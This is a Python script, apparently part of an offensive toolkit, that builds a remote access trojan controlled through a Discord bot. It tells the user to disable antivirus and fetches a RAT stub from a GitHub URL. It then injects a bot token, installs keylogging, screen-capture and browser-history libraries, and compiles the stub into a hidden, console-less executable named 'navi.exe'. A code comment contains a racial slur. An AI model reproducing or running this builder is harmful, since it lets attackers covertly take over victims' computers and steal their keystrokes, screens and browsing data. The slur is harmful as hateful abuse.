import os, sys, subprocess, shutil, time, traceback
from core.display import Colors, Colorate, get_inpt, Theme, print_banner
import webbrowser

def rat_builder_init():
    _cl = Theme.get_colors()
    print_banner()
    print(Colorate.Horizontal(_cl["head"], "  [ RAT BUILDER ]\n"))

    tutorial = get_inpt("Do you need a tutorial? (y/n): ").strip().lower()
    if tutorial == "y":
        webbrowser.open("https://www.youtube.com/watch?v=3dvv1wNfrsQ")

    token = get_inpt("Enter Discord Bot Token: ")
    if not token:
        print(Colorate.Horizontal(_cl["num"], "  [!] No token provided. Aborting."))
        time.sleep(2)
        return

    stub_template = "modules/stub/rat_stub.txt"
    if not os.path.exists(stub_template):
        print(Colorate.Horizontal(_cl["num"], f"  [!] bot template not found: {stub_template}"))
        print(Colorate.Horizontal(_cl["txt"], f"  [!] Warning: The file will be downloaded from GitHub. Turn off ur antivirus! Otherwise the stub will be deleted."))
        input(Colorate.Horizontal(_cl["head"], "  Press Enter to start the download..."))
        try:
            import urllib.request
            os.makedirs(os.path.dirname(stub_template), exist_ok=True)
            url = "https://raw.githubusercontent.com/glockinhand/glockinhand/refs/heads/main/rat_stub.txt" # this is not a backdoor niggers its just the template for rat builder
            urllib.request.urlretrieve(url, stub_template)
            print(Colorate.Horizontal(_cl["head"], "  [+] File downloaded successfully."))
        except Exception as e:
            print(Colorate.Horizontal(_cl["num"], f"  [-] Download failed: {str(e)}"))
            time.sleep(2)
            return

    try:
        if not os.path.exists("build"): 
            os.makedirs("build")
        
        temp_stub = "build/temp.py"

        with open(stub_template, "r", encoding="utf-8") as f:
            content = f.read()

        if "token = ''" in content:
            content = content.replace("token = ''", f"token = '{token}'")
        else:
            lines = content.splitlines()
            while len(lines) < 47: 
                lines.append("")
            lines[46] = f"token = '{token}'"
            content = "\n".join(lines)

        with open(temp_stub, "w", encoding="utf-8") as f:
            f.write(content)

        print(Colorate.Horizontal(_cl["head"], "  [+] Token injected into rat."))

        print(Colorate.Horizontal(_cl["txt"], "  [*] Preparing dependencies..."))
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "comtypes", "pycaw", "pyautogui", "browserhistory", "mss", "pynput", "discord.py", "requests", "pywin32", "-q"])

        print(Colorate.Horizontal(_cl["txt"], "  [*] Compiling rat (Bundling all modules)..."))
        
        output_dir = os.path.join(os.getcwd(), "output")
        if not os.path.exists(output_dir): 
            os.makedirs(output_dir)

        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--distpath", output_dir,
            "--workpath", "build",
            "--specpath", "build",
            "--name", "navi",
            temp_stub
        ]

        process = subprocess.run(cmd, capture_output=True, text=True)

        if process.returncode == 0:
            print(Colorate.Horizontal(_cl["head"], f"  [+] Build successful! All modules packed."))
            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/navi.exe"))
        else:
            print(Colorate.Horizontal(_cl["num"], "  [-] Build failed! Detailed PyInstaller Errors:"))
            print(process.stderr)

        print(Colorate.Horizontal(_cl["txt"], "  [*] Cleaning up build files..."))
        
        input(Colorate.Horizontal(_cl["head"], "\n  Press Enter to return..."))

    except Exception as e:
        error_msg = str(e)
        detailed_error = traceback.format_exc()
        
        if "the system cannot find the file" in error_msg.lower() or "[WinError 2]" in error_msg.lower() or isinstance(e, FileNotFoundError):
            print(Colorate.Horizontal(_cl["num"], "  [-] File not found error!"))
            print(Colorate.Horizontal(_cl["num"], f"  [-] Details: {error_msg}"))
        else:
            print(Colorate.Horizontal(_cl["num"], f"  [-] An error occurred: {error_msg}"))
            print(Colorate.Horizontal(_cl["num"], f"  [-] Full Traceback:\n{detailed_error}"))
        
        time.sleep(5)

if __name__ == "__main__":
    rat_builder_init()
